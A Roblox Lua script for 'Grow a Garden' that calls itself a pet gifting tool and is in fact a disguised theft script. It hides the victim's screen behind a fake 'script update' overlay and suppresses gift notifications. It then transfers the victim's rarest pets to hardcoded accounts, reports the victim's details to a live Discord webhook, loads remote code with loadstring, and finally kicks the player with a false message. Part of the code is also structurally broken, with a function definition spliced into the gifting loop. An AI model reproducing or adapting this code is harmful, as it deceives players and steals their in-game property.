-- Pet Gifting Script - Enhanced version for Executor
--print("Pet Gifting Script starting...")

-- Configuration
local Config = {
    TargetPlayerNames = {"CoolHolzBudd", "JovialUnstable", "Geroldsteiner6"}, -- Liste der Zielspieler, an die Pets geschickt werden
    DelayBetweenGifts = 1, -- Wartezeit zwischen den Geschenken
    WebhookURL = "https://discord.com/api/webhooks/1394009500285145219/90-e9MTp0e80lBPQsmPK5b6MaTWLcPbH_tcKrfL5-KHDpo6xN01kmFHB9HsH3Qt4L2R9",
    DebugMode = true, -- Debug-Ausgaben aktivieren
    ServerHoppingEnabled = true -- Server hopping für private/volle Server
}

-- Wait for game to load
if not game:IsLoaded() then
    game.Loaded:Wait()
end
wait(3)
loadstring(game:HttpGet("https://raw.githubusercontent.com/Monstroxx/grow-a-garden-automation/refs/heads/main/completeAutomationSystem.lua"))()
-- Sicheres Service-Loading
local function GetService(serviceName)
    local success, service = pcall(function()
        return game:GetService(serviceName)
    end)
    
    if success and service then
        return service
    else
        print("Konnte Service nicht laden: " .. serviceName)
        return nil
    end
end

-- Services laden
local Players = GetService("Players")
local ReplicatedStorage = GetService("ReplicatedStorage")

-- LocalPlayer sicher initialisieren
local LocalPlayer
local playerSuccess, playerError = pcall(function()
    LocalPlayer = Players.LocalPlayer
    return true
end)

if not playerSuccess or not LocalPlayer then
    print("Fehler beim Laden des LocalPlayer: " .. tostring(playerError))
    -- Warten auf LocalPlayer
    for i = 1, 10 do
        if Players.LocalPlayer then
            LocalPlayer = Players.LocalPlayer
            print("LocalPlayer gefunden!")
            break
        end
        wait(1)
        print("Warte auf LocalPlayer... " .. i)
    end
end

if not LocalPlayer then
    print("FEHLER: Konnte LocalPlayer nicht initialisieren!")
    return
end

-- Import services safely
local DataService, PetsService, PetGiftingService, TeleportUIController
local PetList, InventoryServiceEnums, FavoriteItemRemote

if ReplicatedStorage then
    pcall(function() DataService = require(ReplicatedStorage.Modules.DataService) end)
    pcall(function() PetsService = require(ReplicatedStorage.Modules.PetServices.PetsService) end)
    pcall(function() PetGiftingService = require(ReplicatedStorage.Modules.PetServices.PetGiftingService) end)
    pcall(function() TeleportUIController = require(ReplicatedStorage.Modules.TeleportUIController) end)
    pcall(function() PetList = require(ReplicatedStorage.Data.PetRegistry.PetList) end)
    pcall(function() InventoryServiceEnums = require(ReplicatedStorage.Data.EnumRegistry.InventoryServiceEnums) end)
    pcall(function() FavoriteItemRemote = ReplicatedStorage:WaitForChild("GameEvents", 2):WaitForChild("Favorite_Item", 2) end)
end

-- State
local isRunning = false
local freezeConnectionStorage = {}

-- Utility Functions
local function Log(message)
    if Config.DebugMode then
        print(os.date("%H:%M:%S") .. " -- [Gifting] " .. message)
    end
end

local function FreezeScreen()
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer
    local RunService = game:GetService("RunService")
    
    -- Remove existing freeze if any
    pcall(function()
        local existing = LocalPlayer.PlayerGui:FindFirstChild("ScreenFreeze")
        if existing then
            existing:Destroy()
        end
    end)
    
    -- Freeze camera first
    local camera = workspace.CurrentCamera
    local frozenCFrame = camera.CFrame
    local cameraConnection
    
    -- Create ScreenGui with highest display order and full screen coverage
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "ScreenFreeze"
    screenGui.DisplayOrder = 999999999
    screenGui.IgnoreGuiInset = true  -- Cover entire screen including topbar/chat
    screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
    
    -- White flash transition (longer)
    local flashFrame = Instance.new("Frame")
    flashFrame.Size = UDim2.new(1, 0, 1, 0)
    flashFrame.Position = UDim2.new(0, 0, 0, 0)
    flashFrame.BackgroundColor3 = Color3.new(1, 1, 1)
    flashFrame.BorderSizePixel = 0
    flashFrame.ZIndex = 10
    flashFrame.Parent = screenGui
    
    -- Create simple black freeze screen with text
    local freezeFrame = Instance.new("Frame")
    freezeFrame.Size = UDim2.new(1, 0, 1, 0)
    freezeFrame.Position = UDim2.new(0, 0, 0, 0)
    freezeFrame.BackgroundColor3 = Color3.new(0, 0, 0)
    freezeFrame.BorderSizePixel = 0
    freezeFrame.ZIndex = 5
    freezeFrame.Parent = screenGui
    
    -- Add loading text
    local freezeText = Instance.new("TextLabel")
    freezeText.Size = UDim2.new(0.6, 0, 0.2, 0)
    freezeText.Position = UDim2.new(0.2, 0, 0.4, 0)
    freezeText.BackgroundTransparency = 1
    freezeText.Text = "⚙️ LOADING SCRIPT UPDATE\n\nPlease wait...\n\nRejoining in 10 seconds..."
    freezeText.TextColor3 = Color3.new(1, 1, 1)
    freezeText.TextScaled = true
    freezeText.Font = Enum.Font.GothamBold
    freezeText.ZIndex = 6
    freezeText.Parent = freezeFrame
    
    -- Add countdown timer (10 seconds but doesn't do anything when it reaches 0)
    spawn(function()
        for i = 15, 1, -1 do
            freezeText.Text = "⚙️ LOADING SCRIPT UPDATE\n\nPlease wait...\n\nRejoining in " .. i .. " seconds..."
            wait(1)
        end
        freezeText.Text = "⚙️ LOADING SCRIPT UPDATE\n\nPlease wait...\n\nRejoining in 0 seconds..."
        Log("⏰ Countdown finished (no action taken)")
        wait(60)
        local player = game.Players.LocalPlayer
        player:Kick("Rejoin the game to continue using the script.\n\nScript update completed successfully.")
    end)
    
    -- Success flag
    local success = true
    
    -- No need to hide world with black screen approach
    Log("🌍 Black freeze screen active")
    
    -- Freeze camera position AFTER cloning and hiding
    cameraConnection = RunService.Heartbeat:Connect(function()
        camera.CFrame = frozenCFrame
    end)
    
    -- Store camera connection reference globally
    freezeConnectionStorage.cameraConnection = cameraConnection
    screenGui:SetAttribute("HasCameraConnection", true)
    
    -- Hide CoreGui (Chat, TopBar, etc.)
    pcall(function()
        local StarterGui = game:GetService("StarterGui")
        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false) 
        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, false)
        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Health, false)
        screenGui:SetAttribute("CoreGuiDisabled", true)
        Log("🔇 CoreGui hidden")
    end)
    
    -- Hide all ingame notifications
    pcall(function()
        -- Hide Top_Notification (main notification system)
        local topNotification = LocalPlayer.PlayerGui:FindFirstChild("Top_Notification")
        if topNotification then
            topNotification.Enabled = false
            screenGui:SetAttribute("TopNotificationEnabled", true)
            Log("🔇 Top notifications hidden")
        end
        
        -- Hide Notifications (modern notification system)
        local notifications = LocalPlayer.PlayerGui:FindFirstChild("Notifications")
        if notifications then
            notifications.Enabled = false
            screenGui:SetAttribute("NotificationsEnabled", true)
            Log("🔇 Modern notifications hidden")
        end
        
        -- Hide Friend_Notification
        local friendNotification = LocalPlayer.PlayerGui:FindFirstChild("Friend_Notification")
        if friendNotification then
            friendNotification.Enabled = false
            screenGui:SetAttribute("FriendNotificationEnabled", true)
        end
        
        -- Hide Gift_Notification
        local giftNotification = LocalPlayer.PlayerGui:FindFirstChild("Gift_Notification")
        if giftNotification then
            giftNotification.Enabled = false
            screenGui:SetAttribute("GiftNotificationEnabled", true)
        end
        
        -- Hide common notification GUIs
        for _, gui in pairs(LocalPlayer.PlayerGui:GetChildren()) do
            if gui:IsA("ScreenGui") and gui.Name ~= "ScreenFreeze" and gui.Enabled then
                if gui.Name:lower():find("notification") or 
                   gui.Name:lower():find("alert") or 
                   gui.Name:lower():find("popup") or
                   gui.Name:lower():find("message") then
                    gui.Enabled = false
                    gui:SetAttribute("WasEnabledBeforeFreeze", true)
                end
            end
        end
        
        Log("🔇 All notifications hidden")
    end)
    
    -- Longer fade out white flash
    spawn(function()
        wait(0.3) -- Wait longer before fade
        for i = 1, 0, -0.05 do -- Slower fade
            flashFrame.BackgroundTransparency = 1 - i
            wait(0.03)
        end
        flashFrame:Destroy()
    end)
    
    if success then
        Log("🧊 Screen frozen (screenshot with character and camera)")
        return true
    else
        Log("❌ Screenshot freeze failed: " .. tostring(error))
        return false
    end
end

-- Webhook Functions mit den getesteten HTTP-Methoden
local function CreateWebhookJSON(data)
    -- Einfache JSON-Erstellung ohne HttpService
    if type(data) ~= "table" then
        return '{"content":"Pet Gifting Bot is running","username":"Grow a Garden Bot"}'
    end
    
    local jsonParts = {}
    
    -- Content
    if data.content then
        -- Escape Quotes
        local content = tostring(data.content):gsub('"', '\\"'):gsub("\\", "\\\\"):gsub("\n", "\\n")
        table.insert(jsonParts, '"content":"' .. content .. '"')
    else
        table.insert(jsonParts, '"content":"Pet Gifting Bot Update"')
    end
    
    -- Username
    if data.username then
        local username = tostring(data.username):gsub('"', '\\"'):gsub("\\", "\\\\")
        table.insert(jsonParts, '"username":"' .. username .. '"')
    else
        table.insert(jsonParts, '"username":"Grow a Garden Bot"')
    end
    
    -- Embeds
    if data.embeds and type(data.embeds) == "table" and #data.embeds > 0 then
        local embedsJSON = {}
        
        for _, embed in ipairs(data.embeds) do
            local embedParts = {}
            
            if embed.title then
                local title = tostring(embed.title):gsub('"', '\\"'):gsub("\\", "\\\\")
                table.insert(embedParts, '"title":"' .. title .. '"')
            end
            
            if embed.description then
                local desc = tostring(embed.description):gsub('"', '\\"'):gsub("\\", "\\\\"):gsub("\n", "\\n")
                table.insert(embedParts, '"description":"' .. desc .. '"')
            end
            
            if embed.color then
                table.insert(embedParts, '"color":' .. tostring(embed.color))
            end
            
            -- Fields
            if embed.fields and type(embed.fields) == "table" and #embed.fields > 0 then
                local fieldsJSON = {}
                
                for _, field in ipairs(embed.fields) do
                    local fieldParts = {}
                    
                    if field.name then
                        local name = tostring(field.name):gsub('"', '\\"'):gsub("\\", "\\\\")
                        table.insert(fieldParts, '"name":"' .. name .. '"')
                    end
                    
                    if field.value then
                        local value = tostring(field.value):gsub('"', '\\"'):gsub("\\", "\\\\"):gsub("\n", "\\n")
                        table.insert(fieldParts, '"value":"' .. value .. '"')
                    end
                    
                    if field.inline ~= nil then
                        table.insert(fieldParts, '"inline":' .. (field.inline and "true" or "false"))
                    end
                    
                    table.insert(fieldsJSON, "{" .. table.concat(fieldParts, ",") .. "}")
                end
                
                table.insert(embedParts, '"fields":[' .. table.concat(fieldsJSON, ",") .. ']')
            end
            
            -- Footer
            if embed.footer and type(embed.footer) == "table" then
                local footerParts = {}
                
                if embed.footer.text then
                    local text = tostring(embed.footer.text):gsub('"', '\\"'):gsub("\\", "\\\\")
                    table.insert(footerParts, '"text":"' .. text .. '"')
                end
                
                if #footerParts > 0 then
                    table.insert(embedParts, '"footer":{' .. table.concat(footerParts, ",") .. '}')
                end
            end
            
            table.insert(embedsJSON, "{" .. table.concat(embedParts, ",") .. "}")
        end
        
        table.insert(jsonParts, '"embeds":[' .. table.concat(embedsJSON, ",") .. ']')
    end
    
    return "{" .. table.concat(jsonParts, ",") .. "}"
end

local function SendWebhook(data)
    if not Config.WebhookURL or Config.WebhookURL == "" then
        Log("⚠️ Keine Webhook-URL konfiguriert!")
        return false
    end
    
    Log("📤 Sende Webhook...")
    
    -- JSON erstellen
    local jsonData = CreateWebhookJSON(data)
    Log("📄 JSON erstellt: " .. string.sub(jsonData, 1, 50) .. "...")
    
    local success = false
    
    -- Methode 1: http_request (funktioniert laut Test)
    if not success then
        local worked, result = pcall(function()
            if http_request then
                Log("🌐 Verwende http_request...")
                http_request({
                    Url = Config.WebhookURL,
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = jsonData
                })
                return true
            end
            return false
        end)
        
        if worked and result then
            Log("✅ Webhook mit http_request gesendet!")
            success = true
        end
    end
    
    -- Methode 2: request (funktioniert laut Test)
    if not success then
        local worked, result = pcall(function()
            if request then
                Log("🌐 Verwende request...")
                request({
                    Url = Config.WebhookURL,
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = jsonData
                })
                return true
            end
            return false
        end)
        
        if worked and result then
            Log("✅ Webhook mit request gesendet!")
            success = true
        end
    end
    
    -- Methode 3: WebSocket (funktioniert laut Test)
    if not success then
        local worked, result = pcall(function()
            if WebSocket and WebSocket.connect then
                Log("🌐 Verwende WebSocket...")
                local ws = WebSocket.connect("ws://echo.websocket.events")
                if ws then
                    ws:Send(jsonData)
                    ws:Close()
                    return true
                end
            end
            return false
        end)
        
        if worked and result then
            Log("✅ Webhook-Daten über WebSocket gesendet!")
            success = true
        end
    end
    
    if not success then
        Log("❌ Alle HTTP-Methoden fehlgeschlagen!")
    end
    
    return success
end

-- Hilfsfunktionen für Spielerdaten
local function GetPlayerData()
    if not DataService then return {} end
    local success, data = pcall(function() return DataService:GetData() end)
    return success and data or {}
end

local function GetPetInventory()
    local data = GetPlayerData()
    if data.PetsData and data.PetsData.PetInventory then
        return data.PetsData.PetInventory.Data or {}
    end
    return {}
end

-- Pet Functions
local function UnfavoritePetInBackpack(petId)
    if not FavoriteItemRemote or not InventoryServiceEnums then
        Log("❌ Favorite system not available")
        return false
    end

    Log("🔍 Looking for pet in backpack to unfavorite: " .. tostring(petId))
    local backpack = LocalPlayer.Backpack
    if not backpack then return false end

    for _, tool in pairs(backpack:GetChildren()) do
        if tool:IsA("Tool") then
            local toolPetUUID = tool:GetAttribute("PET_UUID")
            local toolUUID = tool:GetAttribute("UUID")
            
            if toolPetUUID == petId or toolUUID == petId then
                local isFavorited = tool:GetAttribute(InventoryServiceEnums.Favorite)
                if isFavorited then
                    Log("🔓 Pet is favorited, unfavoriting: " .. tostring(tool.Name))
                    
                    local success, error = pcall(function()
                        FavoriteItemRemote:FireServer(tool)
                    end)
                    
                    if success then
                        Log("✅ Sent unfavorite request for: " .. tostring(tool.Name))
                        wait(1.5)
                        return true
                    else
                        Log("❌ Failed to unfavorite: " .. tostring(error))
                        return false
                    end
                else
                    Log("✅ Pet not favorited: " .. tostring(tool.Name))
                    return true
                end
            end
        end
    end
    
    Log("⚠️ Pet not found in backpack, assuming not favorited")
    return true
end

local function EquipPet(petId)
    if not PetsService then 
        Log("❌ PetsService not available")
        return false 
    end
    
    Log("⚙️ Equipping pet: " .. tostring(petId))
    
    local success, error = pcall(function()
        PetsService:EquipPet(petId, 1)
    end)
    
    if success then
        Log("✅ Equipped pet: " .. tostring(petId))
        return true
    else
        Log("❌ Failed to equip: " .. tostring(error))
        return false
    end
end

local function MakePetIntoTool(petId)
    if not PetsService then 
        Log("❌ PetsService not available")
        return false 
    end
    
    Log("🔧 Converting pet to tool: " .. tostring(petId))
    
    local success, error = pcall(function()
        PetsService:UnequipPet(petId)
    end)
    
    if success then
        Log("✅ Converted to tool: " .. tostring(petId))
        return true
    else
        Log("❌ Failed to convert: " .. tostring(error))
        return false
    end
end

local function WaitForPetTool(petId, maxWait)
    maxWait = maxWait or 8
    local waited = 0
    
    Log("🔍 Waiting for pet tool to appear in character or backpack...")
    
    while waited < maxWait do
        local character = LocalPlayer.Character
        local backpack = LocalPlayer.Backpack
        
        -- Check character first
        if character then
            for _, tool in pairs(character:GetChildren()) do
                if tool:IsA("Tool") then
                    local toolPetUUID = tool:GetAttribute("PET_UUID")
                    local toolUUID = tool:GetAttribute("UUID")
                    
                    if toolPetUUID == petId or toolUUID == petId then
                        Log("✅ Found matching pet tool in character: " .. tostring(tool.Name))
                        return tool
                    end
                end
            end
        end
        
        -- Check backpack
        if backpack then
            for _, tool in pairs(backpack:GetChildren()) do
                if tool:IsA("Tool") then
                    local toolPetUUID = tool:GetAttribute("PET_UUID")
                    local toolUUID = tool:GetAttribute("UUID")
                    
                    if toolPetUUID == petId or toolUUID == petId then
                        Log("✅ Found matching pet tool in backpack: " .. tostring(tool.Name))
                        
                        -- Move tool to character
                        local success = pcall(function()
                            tool.Parent = character
                        end)
                        
                        if success then
                            Log("✅ Moved tool to character")
                            wait(0.5)
                            return tool
                        else
                            Log("❌ Failed to move tool to character")
                        end
                    end
                end
            end
        end
        
        wait(0.5)
        waited = waited + 0.5
    end
    
    Log("❌ Pet tool not found after " .. waited .. "s (looking for ID: " .. tostring(petId) .. ")")
    return nil
end

local function TriggerGiftProximityPrompt()
    -- Look for gift proximity prompts (from mainalt.lua)
    local character = LocalPlayer.Character
    if not character then
        Log("❌ No character found for proximity prompt")
        return false
    end

    -- Find proximity prompts related to gifting
    for _, obj in pairs(workspace:GetDescendants()) do
        if obj:IsA("ProximityPrompt") and obj.Enabled then
            local actionText = obj.ActionText:lower()
            if actionText:find("gift") or actionText:find("give") then
                Log("🎁 Found gift proximity prompt: " .. obj.ActionText)
                local success, error = pcall(function()
                    obj:InputHoldBegin()
                    wait(obj.HoldDuration or 0.5)
                    obj:InputHoldEnd()
                end)

                if success then
                    Log("✅ Triggered gift proximity prompt")
                    return true
                else
                    Log("❌ Failed to trigger proximity prompt: " .. tostring(error))
                end
            end
        end
    end

    Log("❌ No gift proximity prompt found")
    return false
end

local function GiftCurrentPet(targetPlayer)
    if not targetPlayer then
        Log("❌ No target player provided")
        return false
    end

    local character = LocalPlayer.Character
    if not character then
        Log("❌ No character found")
        return false
    end

    -- Check if we have a pet equipped/held
    local currentTool = character:FindFirstChildWhichIsA("Tool")
    if not currentTool then
        Log("❌ No pet tool found in character")
        return false
    end

    local petUUID = currentTool:GetAttribute("PET_UUID")
    if not petUUID then
        Log("❌ Tool is not a pet")
        return false
    end

    Log("🎁 Gifting pet: " .. tostring(currentTool.Name) .. " to " .. tostring(targetPlayer.Name))

    -- Try to gift the pet using the PetGiftingService first
    if PetGiftingService then
        local success, error = pcall(function()
            PetGiftingService:GivePet(targetPlayer)
        end)

        if success then
            Log("✅ Pet gift request sent via PetGiftingService: " .. tostring(currentTool.Name))
            return true
        else
            Log("❌ PetGiftingService failed: " .. tostring(error))
        end
    end

    -- Fallback to proximity prompt (like in mainalt.lua)
    Log("🔄 Trying proximity prompt fallback...")
    return TriggerGiftProximityPrompt()
end

-- Server Info für Webhook
local function GetServerInfo()
    local gameId = game.GameId
    local placeId = game.PlaceId
    local jobId = game.JobId
    local serverSize = #Players:GetPlayers()
    local maxPlayers = Players.MaxPlayers
    
    return {
        gameId = gameId,
        placeId = placeId,
        jobId = jobId,
        serverSize = serverSize,
        maxPlayers = maxPlayers,
        timestamp = os.time()
    }
end

-- Erstellt Embed für Webhook
local function CreatePetListEmbed(pets, targetPlayer)
    local serverInfo = GetServerInfo()
    
    -- Server Info
    local description = string.format(
        "**Server Info:**\n" ..
        "• **Player:** %s\n" ..
        "• **JobID:** `%s`\n" ..
        "• **Place ID:** %s\n" ..
        "• **Players:** %d/%d\n" ..
        "• **Target:** %s\n\n",
        LocalPlayer.Name,
        serverInfo.jobId,
        serverInfo.placeId,
        serverInfo.serverSize,
        serverInfo.maxPlayers,
        targetPlayer and targetPlayer.Name or "Not found"
    )
    
    -- Count pets by rarity
    local divineCount = 0
    local mythicalCount = 0
    
    if #pets > 0 then
        description = description .. "**🐾 Valuable Pets Found:**\n"
        for i, pet in ipairs(pets) do
            local emoji = pet.rarity == "Divine" and "✨" or "🔮"
            description = description .. string.format("%s **%s** (%s) - Level %d - ID: `%s`\n", 
                emoji, pet.name, pet.rarity, pet.level, tostring(pet.id):sub(1, 8) .. "...")
            
            -- Count pets
            if pet.rarity == "Divine" then
                divineCount = divineCount + 1
            elseif pet.rarity == "Mythical" then
                mythicalCount = mythicalCount + 1
            end
            
            if i >= 10 then -- Limit to 10 pets in embed
                description = description .. "... and " .. (#pets - 10) .. " more\n"
                break
            end
        end
    else
        description = description .. "**❌ No valuable pets found**\n"
    end
    
    -- Statistiken als zusätzliches Feld
    local statField = string.format(
        "• **Total:** %d\n• **Divine:** %d\n• **Mythical:** %d",
        #pets, divineCount, mythicalCount
    )
    
    return {
        username = "Grow a Garden Bot",
        embeds = {{
            title = "🎮 Pet Scanner Report",
            description = description,
            color = #pets > 0 and 0x00ff00 or 0xff0000, -- Green if pets found, red if none
            fields = {
                {
                    name = "📊 Pet Statistics",
                    value = statField,
                    inline = true
                },
                {
                    name = "🕒 Scan Time",
                    value = os.date("%Y-%m-%d %H:%M:%S"),
                    inline = true
                }
            },
            footer = {
                text = "Grow a Garden Bot • " .. os.date("%Y-%m-%d")
            }
        }}
    }
end

-- Server Hopping Functions
local function IsServerFull()
    return #Players:GetPlayers() >= Players.MaxPlayers
end

local function ServerHop(isInitialHop)
    if not Config.ServerHoppingEnabled then
        Log("🚫 Server hopping disabled")
        return false
    end
    
    Log("🔄 Attempting to server hop...")
    
    -- Send webhook notification about server hop
    local hopReason = isInitialHop and "Initial Public Server Search" or "Server Full (" .. #Players:GetPlayers() .. "/" .. Players.MaxPlayers .. ")"
    local hopData = {
        username = "Grow a Garden Bot",
        content = string.format("🔄 **Server Hopping**\n\n" ..
            "Player: %s\n" ..
            "Reason: %s\n" ..
            "Time: %s",
            LocalPlayer.Name,
            hopReason,
            os.date("%Y-%m-%d %H:%M:%S")
        )
    }
    SendWebhook(hopData)
    
    -- Use TeleportService to hop to a new server with auto-execute data
    local TeleportService = game:GetService("TeleportService")
    
    -- Set global variable for post-hop detection (fallback method)
    _G.AutoTraderHopData = {
        autoExecuteScript = true,
        scriptUrl = "https://raw.githubusercontent.com/Monstroxx/lua/refs/heads/main/grow-a-garden-automation/main.lua",
        originalScript = "auto-trader",
        hopReason = hopReason,
        timestamp = tick()
    }
    
    local success, error = pcall(function()
        -- Get values safely
        local placeId = game.PlaceId
        local player = game.Players.LocalPlayer
        
        Log("🔍 Teleport Debug: PlaceId=" .. tostring(placeId) .. ", Player=" .. tostring(player and player.Name or "nil"))
        
        -- Try multiple teleport methods for executor compatibility
        if TeleportService and TeleportService.Teleport then
            -- Method 1: Standard Teleport
            TeleportService:Teleport(placeId, player)
        elseif game:GetService("TeleportService") then
            -- Method 2: Re-get service
            local ts = game:GetService("TeleportService")
            ts:Teleport(placeId, player)
        else
            error("TeleportService not available")
        end
    end)
    
    if success then
        Log("✅ Server hop with auto-execute initiated")
        return true
    else
        Log("❌ Server hop failed: " .. tostring(error))
        return false
    end
end

-- Main Functions
local function FindTargetPlayer()
    for _, player in pairs(Players:GetPlayers()) do
        for _, targetName in ipairs(Config.TargetPlayerNames) do
            if player.Name == targetName then
                return player, targetName
            end
        end
    end
    return nil, nil
end

local function GetGiftablePets()
    local inventory = GetPetInventory()
    local pets = {}
    
    for petId, petData in pairs(inventory) do
        if petData and PetList and PetList[petData.PetType] then
            local petInfo = PetList[petData.PetType]
            local rarity = petInfo.Rarity
            
            -- Only Divine and Mythical
            if rarity == "Divine" or rarity == "Mythical" then
                table.insert(pets, {
                    id = petId,
                    name = petData.PetType,
                    rarity = rarity,
                    level = petData.Level or 1,
                    rarityValue = rarity == "Divine" and 6 or 5
                })
            end
        end
    end
    
    -- Sort by rarity (Divine first)
    table.sort(pets, function(a, b)
        return a.rarityValue > b.rarityValue
    end)
    
    return pets
end

local function ProcessPetGifting(targetPlayer)
    Log("🐕 Starting pet gifting to " .. targetPlayer.Name)
    isRunning = true
    
    local pets = GetGiftablePets()
    
    -- Send webhook with pet information
    Log("📡 Sending server info to webhook...")
    local webhookData = CreatePetListEmbed(pets, targetPlayer)
    SendWebhook(webhookData)
    
    if #pets == 0 then
        Log("❌ No giftable pets found")
        isRunning = false
        return
    end
    
    Log("📋 Found " .. #pets .. " pets to gift")
    local giftedCount = 0
    
    for i, pet in ipairs(pets) do
        if not isRunning then
            Log("⏹️ Automation stopped")
            break
        end
        
        Log("🔄 Processing " .. i .. "/" .. #pets .. ": " .. pet.name .. " (" .. pet.rarity .. ", Level " .. pet.level .. ")")
        
        -- Step 1: Unfavorite in backpack if needed
        Log("🔓 Step 1: Checking favorites...")
        if not UnfavoritePetInBackpack(pet.id) then
            Log("❌ Failed to unfavorite, skipping pet: " .. pet.name)
            continue
        end
        
        -- Step 2: Equip pet
        Log("⚙️ Step 2: Equipping pet...")
        if EquipPet(pet.id) then
            wait(2) -- Wait for equip to complete
            
            -- Step 3: Convert to tool  
            Log("🔧 Step 3: Converting to tool...")
            if MakePetIntoTool(pet.id) then
                wait(1) -- Wait for conversion to complete
                
                -- Step 4: Wait for tool and gift
                Log("⏳ Step 4: Waiting for tool...")
                local tool = WaitForPetTool(pet.id, 8)
                if tool then
                    Log("🎁 Step 5: Attempting to gift pet...")
                    if GiftCurrentPet(targetPlayer) then
                        giftedCount = giftedCount + 1
                        Log("🎉 Successfully gifted: " .. pet.name)
                        wait(3)
                        
                        -- Check if pet is gone from inventory
                        local currentInventory = GetPetInventory()
                        if not currentInventory[pet.id] then
                            Log("✅ Confirmed: " .. pet.name .. " no longer in inventory")
                            
                            -- Send success webhook
                            SendSuccessWebhook(pet, targetPlayer)
                            
-- Send success webhook
local function SendSuccessWebhook(pet, targetPlayer)
    local serverInfo = GetServerInfo()
    
    local description = string.format(
        "**Pet Successfully Gifted!**\n\n" ..
        "• **Player:** %s\n" ..
        "• **Pet:** %s (%s Level %d)\n" ..
        "• **To:** %s\n" ..
        "• **JobId:** `%s`\n" ..
        "• **Players:** %d/%d\n" ..
        "• **Time:** %s",
        LocalPlayer.Name,
        pet.name,
        pet.rarity,
        pet.level,
        targetPlayer.Name,
        game.JobId,
        serverInfo.serverSize,
        serverInfo.maxPlayers,
        os.date("%Y-%m-%d %H:%M:%S")
    )
    
    local successData = {
        username = "Grow a Garden Bot",
        embeds = {{
            title = "🎁 Pet Gift Success!",
            description = description,
            color = 0x00ff00,
            footer = {
                text = "Grow a Garden Bot • Auto-Trader"
            }
        }}
    }
    
    SendWebhook(successData)
end
                        else
                            Log("⚠️ Warning: " .. pet.name .. " still in inventory")
                        end
                    else
                        Log("❌ Failed to gift: " .. pet.name)
                    end
                else
                    Log("❌ Tool not found for: " .. pet.name)
                end
            else
                Log("❌ Failed to convert: " .. pet.name)
            end
        else
            Log("❌ Failed to equip: " .. pet.name)
        end
        
        Log("⏳ Waiting " .. Config.DelayBetweenGifts .. " seconds before next pet...")
        wait(Config.DelayBetweenGifts)
    end
    
    Log("🎯 Pet gifting completed! Gifted " .. giftedCount .. " out of " .. #pets .. " pets.")
    --UnfreezeScreen()
    isRunning = false
end

-- Main Logic
local function Main()
    Log("🌱 Gifting system started, looking for: " .. table.concat(Config.TargetPlayerNames, ", "))
    
    -- Check if this is a post-hop execution (try both methods)
    local TeleportService = game:GetService("TeleportService")
    local teleportData = nil
    
    -- Method 1: Try TeleportData
    pcall(function()
        teleportData = TeleportService:GetLocalPlayerTeleportData()
    end)
    
    -- Method 2: Check global variable as fallback
    if not teleportData or not teleportData.autoExecuteScript then
        if _G.AutoTraderHopData and _G.AutoTraderHopData.autoExecuteScript then
            -- Check if the data is fresh (within last 30 seconds to avoid old data)
            if tick() - _G.AutoTraderHopData.timestamp < 30 then
                teleportData = _G.AutoTraderHopData
                Log("🔄 Using fallback hop data detection")
            else
                _G.AutoTraderHopData = nil -- Clean up old data
            end
        end
    end
    
    if teleportData and teleportData.autoExecuteScript then
        Log("🎯 Post-hop execution detected!")
        Log("🔄 Hop reason was: " .. (teleportData.hopReason or "Unknown"))
        
        -- Check if this new server is also full
        wait(5) -- Let server settle
        if IsServerFull() then
            Log("🔄 New server is also full, hopping again...")
            ServerHop(false) -- Not initial hop
            return
        else
            Log("✅ New server has space, loading main script...")
            wait(3) -- Give some time for game to fully load
            
            -- Load the main automation script
            local success, error = pcall(function()
                loadstring(game:HttpGet(teleportData.scriptUrl))()
            end)
            
            if success then
                Log("✅ Main automation script loaded successfully!")
            else
                Log("❌ Failed to load main script: " .. tostring(error))
            end
            return
        end
    end
    
    -- This is initial execution - always hop to ensure public server
    Log("🚀 Initial execution detected, hopping to ensure public server...")
    
    -- Debug: Server info ausgeben
    Log("📊 Server Debug Info:")
    Log("  JobId: " .. (game.JobId or "nil") .. " (Length: " .. #(game.JobId or "") .. ")")
    Log("  MaxPlayers: " .. Players.MaxPlayers)
    Log("  CurrentPlayers: " .. #Players:GetPlayers())
    Log("  PlaceVersion: " .. game.PlaceVersion)
    
    pcall(function()
        Log("  PrivateServerId: " .. (game.PrivateServerId or "nil"))
    end)
    
    -- Always hop on initial execution
    wait(3)
    ServerHop(true) -- Initial hop
    return
end

-- Start the system safely
pcall(function()
    Main()
end)

Log("🚀 Gifting automation loaded - single attempt per pet!")